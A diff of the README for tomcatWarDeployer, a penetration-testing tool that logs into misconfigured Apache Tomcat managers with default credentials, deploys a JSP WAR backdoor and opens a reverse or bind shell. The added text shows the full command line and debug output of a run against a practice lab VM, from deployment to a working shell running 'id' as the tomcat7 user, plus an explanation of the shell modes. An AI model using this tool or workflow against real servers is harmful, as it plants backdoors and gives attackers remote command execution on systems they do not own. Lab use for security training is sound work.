@@ -13,14 +13,15 @@ Here goes the help:
 ```
 user$ python tomcatWarDeployer.py --help
 
-Apache Tomcat 6/7 auto WAR deployment & launching tool
+    tomcatWarDeployer (v. 0.3)
+    Apache Tomcat 6/7 auto WAR deployment & launching tool
     Mariusz B. / MGeeky '16
 
 Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.
     
 Usage: tomcatWarDeployer.py [options] server
 
-  server		Specifies server address. Please also include port after colon.
+  server    Specifies server address. Please also include port after colon.
 
 Options:
   -h, --help            show this help message and exit
@@ -51,6 +52,9 @@ Options:
                         as a Bind shell endpoint.
     -u URL, --url=URL   Apache Tomcat management console URL. Default:
                         /manager/
+    -t TIMEOUT, --timeout=TIMEOUT
+                        Speciifed timeout parameter for socket object and
+                        other timing holdups. Default: 10
 
   Payload options:
     -R APPNAME, --remove=APPNAME
@@ -61,7 +65,7 @@ Options:
                         to prevent unauthenticated usage. Default: randomly
                         generated. Specify "None" to leave the shell
                         unauthenticated.
-    -t TITLE, --title=TITLE
+    -T TITLE, --title=TITLE
                         Specifies head>title for uploaded JSP WAR payload.
                         Default: "JSP Application"
     -n APPNAME, --name=APPNAME
@@ -82,31 +86,32 @@ And sample usage on [Kevgir 1 VM by canyoupwn.me](https://www.vulnhub.com/entry/
 
 
 ```
-user$ python tomcatWarDeployer.py -C -x -v -H 192.168.56.101 -p 4545 -n shell 192.168.56.100:8080
+user$ python tomcatWarDeployer.py -v -x -p 4449 -H 192.168.56.102 192.168.56.100:8080
 
-    Apache Tomcat auto WAR deployment & launching tool
+    tomcatWarDeployer (v. 0.3)
+    Apache Tomcat 6/7 auto WAR deployment & launching tool
     Mariusz B. / MGeeky '16
 
 Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.
     
-INFO: Reverse shell will connect to: 192.168.56.101:4545.
+INFO: Reverse shell will connect to: 192.168.56.102:4449.
 DEBUG: Browsing to "http://192.168.56.100:8080/manager/"... Creds: tomcat:tomcat
 DEBUG: Apache Tomcat Manager Application reached & validated.
 DEBUG: Generating JSP WAR backdoor code...
 DEBUG: Preparing additional code for Reverse TCP shell
-DEBUG: Generating temporary structure for shell WAR at: "/tmp/tmpzndaGR"
+DEBUG: Generating temporary structure for jsp_app WAR at: "/tmp/tmpDhzo9I"
 DEBUG: Working with Java at version: 1.8.0_60
 DEBUG: Generating web.xml with servlet-name: "JSP Application"
-DEBUG: Generating WAR file at: "/tmp/shell.war"
+DEBUG: Generating WAR file at: "/tmp/jsp_app.war"
 DEBUG: added manifest
 adding: files/(in = 0) (out= 0)(stored 0%)
 adding: files/WEB-INF/(in = 0) (out= 0)(stored 0%)
-adding: files/WEB-INF/web.xml(in = 541) (out= 254)(deflated 53%)
+adding: files/WEB-INF/web.xml(in = 547) (out= 253)(deflated 53%)
 adding: files/META-INF/(in = 0) (out= 0)(stored 0%)
 adding: files/META-INF/MANIFEST.MF(in = 68) (out= 67)(deflated 1%)
-adding: index.jsp(in = 4684) (out= 1597)(deflated 65%)
+adding: index.jsp(in = 4684) (out= 1595)(deflated 65%)
 DEBUG: WAR file structure:
-DEBUG: /tmp/tmpzndaGR
+DEBUG: /tmp/tmpDhzo9I
 ├── files
 │   ├── META-INF
 │   │   └── MANIFEST.MF
@@ -115,22 +120,38 @@ DEBUG: /tmp/tmpzndaGR
 └── index.jsp
 
 3 directories, 3 files
-WARNING: Application with name: "shell" is already deployed.
+WARNING: Application with name: "jsp_app" is already deployed.
 DEBUG: Unloading existing one...
-DEBUG: Unloading application: "http://192.168.56.100:8080/shell/"
+DEBUG: Unloading application: "http://192.168.56.100:8080/jsp_app/"
 DEBUG: Succeeded.
-DEBUG: Deploying application: shell from file: "/tmp/shell.war"
-DEBUG: Removing temporary WAR directory: "/tmp/tmpzndaGR"
+DEBUG: Deploying application: jsp_app from file: "/tmp/jsp_app.war"
+DEBUG: Removing temporary WAR directory: "/tmp/tmpDhzo9I"
 DEBUG: Succeeded, invoking it...
-DEBUG: Invoking application at url: "http://192.168.56.100:8080/shell/"
-DEBUG: Adding 'X-Pass: b8vYQ9EU7suV' header for shell functionality authentication.
-WARNING: Set up your incoming shell listener, I'm giving you 3 seconds.
-INFO: JSP Backdoor up & running on http://192.168.56.100:8080/shell/
-INFO: Happy pwning, here take that password for web shell: 'b8vYQ9EU7suV'
+DEBUG: Spawned shell handling thread. Awaiting for the event...
+DEBUG: Awaiting for reverse-shell handler to set-up
+DEBUG: Establishing listener for incoming reverse TCP shell at 192.168.56.102:4449
+DEBUG: Socket is binded to local port now, awaiting for clients...
+DEBUG: Invoking application at url: "http://192.168.56.100:8080/jsp_app/"
+DEBUG: Adding 'X-Pass: oHI9mPB0mOnZ' header for shell functionality authentication.
+DEBUG: Incoming client: 192.168.56.100:54251
+INFO: JSP Backdoor up & running on http://192.168.56.100:8080/jsp_app/
+INFO: Happy pwning. Here take that password for web shell: 'oHI9mPB0mOnZ'
+DEBUG: Connected with the shell: tomcat7@canyoupwnme
+
+tomcat7@canyoupwnme $ id
+uid=106(tomcat7) gid=114(tomcat7) groups=114(tomcat7)
+
+tomcat7@canyoupwnme $ exit
+
 ```
 
-Which will result in the following JSP application accessible remotely via WEB:
+The program will set-up a local listener for reverse-shell connection on the 192.168.56.102:4449 host (local host) as in the example above. Then, after invoking JSP Backdoor it will automatically connect with the local listener, resulting in shell being popped up. One can also skip `-H` parameter in order to go with _bind shell_ functionality, whereas rather then setting local listener - the program will go and connect with remotely listening bind-shell.
+
+Finally, the above invocation will result in the following JSP application accessible remotely via WEB:
+
+
 ![JSP backdoor gui](screen1.png)
+
 
 As one can see, there is password needed for leveraging deployed backdoor, preventing thus unauthenticated access during conducted assessment.
 
@@ -152,8 +173,8 @@ That would be all I guess.
 
 ### TODO
 
-* ~~Implement bind & reverse tcp payload functionality~~ as well as some pty to interact with it
-* Finish implementing noconnect and connect functionality
+* ~~Implement bind & reverse tcp payload functionality as well as some pty to interact with it~~
+* ~~Finish implementing noconnect and connect functionality~~
+* Implement sort of communication authentication and encryption/encoding, to prevent flow of plain-text data through the wire/ether
 * Test it on tomcat8
-
 
